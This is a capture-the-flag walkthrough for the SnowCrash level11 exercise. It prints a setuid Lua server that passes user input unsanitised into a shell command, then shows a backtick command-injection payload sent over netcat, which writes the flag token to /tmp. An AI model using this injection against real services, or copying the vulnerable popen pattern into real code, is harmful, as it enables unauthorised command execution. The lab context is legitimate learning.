# 1st Step
List the files in level11 user home directory to find 'level11.lua' file owned by `flag11` user  
```
level11@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
level11@SnowCrash:~$ cat level11.lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
level11@SnowCrash:~$
```
About lua files : [Wikipedia](https://fr.wikipedia.org/wiki/Lua)  
I don't really understand what this file do but it create a local server with an IP adress and a port so let's listen it with netcat and try to understand how we can get our flag  

# 2nd Step
```
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password:
```
We ask us a password, let's try the hash one in the .lua file :
```
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: f05d1d066fb246efe0c6f7d095f909a7a0cf34a0
Erf nope..
level11@SnowCrash:~$
```
Mmmmmmh .. it don't really help. Let's do some tests and try to execute commands
```
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: getflag
Erf nope..
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: `getflag`
Erf nope..
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: getflag > /tmp/flag
Erf nope..
level11@SnowCrash:~$ cat /tmp/flag
getflag
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: `getflag` > /tmp/flag
Erf nope..
level11@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
level11@SnowCrash:~$
```
Ok .. it was easy  
```
level11@SnowCrash:~$ su level12
Password:
level12@SnowCrash:~$
```
Level11 passed !